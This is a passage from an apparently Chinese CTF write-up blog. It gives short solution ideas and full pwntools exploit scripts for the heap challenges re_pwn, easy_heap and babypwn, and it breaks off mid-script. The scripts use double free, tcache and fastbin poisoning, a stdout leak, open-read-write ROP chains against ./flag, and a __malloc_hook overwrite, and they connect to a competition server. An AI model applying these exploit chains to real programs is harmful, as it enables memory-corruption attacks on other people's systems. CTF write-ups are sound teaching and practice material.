title="思路"></a>思路</h4><p>只能进行add和free操作，并且有个可以输出栈上信息的函数，通过解密即可得到libc和stack的地址。存在double free漏洞，并且由于禁用了execute的系统调用，所以申请回栈上，通过rop来进行ORW操作。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(res)</span>:</span></span><br><span class="line">v5=[<span class="number">51</span>,<span class="number">18</span>,<span class="number">120</span>,<span class="number">36</span>]</span><br><span class="line">v9=<span class="number">9</span></span><br><span class="line">v7=<span class="number">0x26a77aaa</span></span><br><span class="line"><span class="keyword">while</span> v9&gt;<span class="number">0</span>:  </span><br><span class="line">    v10 = (v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">v6 = res[(i<span class="number">-1</span>+<span class="number">16</span>)%<span class="number">16</span>]</span><br><span class="line">res[i] -= (((v6 &gt;&gt; <span class="number">7</span>) ^ <span class="number">8</span> * res[(i + <span class="number">1</span>)%<span class="number">16</span>]) + ((res[(i + <span class="number">1</span>)%<span class="number">16</span>] &gt;&gt; <span class="number">2</span>) ^ <span class="number">32</span> * v6) - <span class="number">33</span>) ^ ((res[(i + <span class="number">1</span>)%<span class="number">16</span>] ^ v7 ^ <span class="number">0x57</span>)+ (v6 ^ v5[v10 ^ i &amp; <span class="number">3</span>])+ <span class="number">63</span>)</span><br><span class="line">res[i]&amp;=<span class="number">0xff</span></span><br><span class="line">    v7 -= <span class="number">0x76129BDA</span></span><br><span class="line">    v7&amp;=<span class="number">0xffffffff</span></span><br><span class="line">    v9-=<span class="number">1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"re_pwn"</span>).libc</span><br><span class="line"><span class="comment">#p = process("./re_pwn")</span></span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10035"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"how long?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"which one?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">" choice:"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.send(<span class="string">"\n"</span>)</span><br><span class="line">rev = p.recv(<span class="number">0x10</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rev)):</span><br><span class="line">res.append(u32(rev[i]+<span class="string">'\x00'</span>*<span class="number">3</span>))</span><br><span class="line">dec(res)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rev)):</span><br><span class="line">s += chr(res[i])</span><br><span class="line">libc.address = u64(s[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x5F1A88</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">stack = u64(s[<span class="number">8</span>:<span class="number">14</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000021112</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x00000000000202f8</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">pop_rsp = <span class="number">0x0000000000003838</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x00000000000bc3f5</span> + libc.address</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(stack - <span class="number">0xf3</span>))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaa'</span>)<span class="comment">#4</span></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *'+hex(syscall))</span></span><br><span class="line">pay = <span class="string">'\x00'</span>*<span class="number">0x3</span></span><br><span class="line">pay += p64(pop_rdx)</span><br><span class="line">pay += p64(<span class="number">0x100</span>)</span><br><span class="line">pay += p64(pop_rax)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(pop_rsi)</span><br><span class="line">pay += p64(stack<span class="number">-0xe0</span>+<span class="number">5</span>*<span class="number">8</span>+<span class="number">0x10</span>)</span><br><span class="line">pay += p64(pop_rsp)</span><br><span class="line">pay += p64(stack<span class="number">-0xe0</span>)</span><br><span class="line"><span class="keyword">print</span> hex(len(pay))</span><br><span class="line">add(<span class="number">0x68</span>,pay)<span class="comment">#5</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack+<span class="number">0x30</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">'./flag\x00'</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>存在double free漏洞。首先填满tcache，并leak出libc地址。接着修改堆上指向name堆块的地址为environ变量，从而leak出stack地址。接着通过tcache的double free任意申请地址到栈上，从而用rop来进行ORW操作获取flag。</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="number">10009</span>)</span><br><span class="line">libc = ELF(<span class="string">"easy_heap"</span>).libc</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) - <span class="number">0x3a0</span></span><br><span class="line">print(hex(heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">free(<span class="number">3</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>):</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">9</span>,p64(heap+<span class="number">0xb90</span>)*<span class="number">2</span>+<span class="string">b'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">0xa</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>,<span class="number">0xb</span>+<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) - <span class="number">0x1EBBE0</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'environ'</span>]))</span><br><span class="line">add(<span class="number">0x2f8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"ontent: "</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00'</span>*<span class="number">2</span>) </span><br><span class="line">print(hex(stack))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(stack<span class="number">-0x120</span>))</span><br><span class="line">add(<span class="number">0x2f8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x2f8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x16A0)')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011c1e1</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0xE6169</span>+ libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack<span class="number">-0x30</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">b'./flag\x00'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>比较恶心的概率题。首先通过<code>malloc_consolidate()</code>将fastbin中的堆块放入smallbin中，从而得到libc的地址。申请回来，修改低位，爆破到stdout结构附近。接着利用double free，并修改低位地址，爆破到上述存储有stdout结构地址处的堆块，从而申请到stdout处进行IO_leak。接着就是double free申请到<code>__malloc_hook</code>然后用<code>one_gadgets</code>来getshell。PS:1/256概率，日常脸黑，打了半个多小时才出来。</p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("babypwn")</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"babypwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#p = process("babypwn")</span></span><br><span class="line">p = remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10031"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,message)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">" message:"</span>)</span><br><span class="line">p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>*<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\xdd\x25'</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x30\x70'</span>,<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>,<span class="string">'a\n'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"choice : "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"game's name: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x68</span>))</span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">0x18</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) <span class="number">-0x3C5600</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"game's"</span>)</span><br><span class="line">p.send(<span class="string">'a\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>),<span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span 